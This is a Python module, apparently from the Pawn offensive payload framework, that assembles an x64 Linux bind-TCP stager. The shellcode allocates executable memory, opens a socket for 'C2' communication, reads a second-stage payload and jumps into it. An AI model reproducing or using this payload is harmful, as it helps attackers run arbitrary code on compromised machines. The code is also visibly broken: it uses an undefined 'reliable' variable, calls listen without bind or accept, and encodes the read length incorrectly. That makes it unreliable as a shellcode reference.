"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from typing import Optional
from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket

from pawn.lib.module import Module


class PawnModule(Module, Socket, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "linux/x64/bind_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Architecture': "x64",
            'Platform': "linux",
            'SendSize': False
        }

    def run(self, port: int, length: int = 4096) -> bytes:
        port = self.pack_port(port)

        payload = dedent(f"""\
            start:
                /*
                 * Allocate space in memory for out phase
                 * mmap(NULL, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
                 */

                push 0x9
                pop rax
                xor rdi, rdi
                push {'0x%08x' % length}
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

        """)

        if reliable:
            payload += dedent("""\
                    test rax, rax
                    js fail
            """)

        payload += dedent(f"""\
                push rax

                /*
                 * Set up socket for further communication with C2
                 * socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
                 */

                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall

                xchg rdi, rax
                push rdx
                mov dword ptr [rsp], 0x{port.hex()}0002
                mov rsi, rsp
                push 0x10
                pop rdx
                push 0x32
                pop rax
                syscall

                /*
                 * Read phase to allocated memory space
                 * read(rdi, rsi, length)
                 */

                pop rsi
                push 0x{length.to_bytes(8, 'little').hex()}
                pop rdx
                syscall

                /* Down the rabbit hole! */
                jmp rsi
        """)

        if reliable:
            payload += dedent("""\
                    test rax, rax
                    js fail
            """)

        if reliable:
            payload += dedent("""\
                fail:
                    /*
                    * Exit phase in case of failure
                    * exit(0)
                    */

                    push 0x3c
                    pop rax
                    xor rdi, rdi
                    syscall
            """)

        return self.assemble(
            self.details['Architecture'], payload)
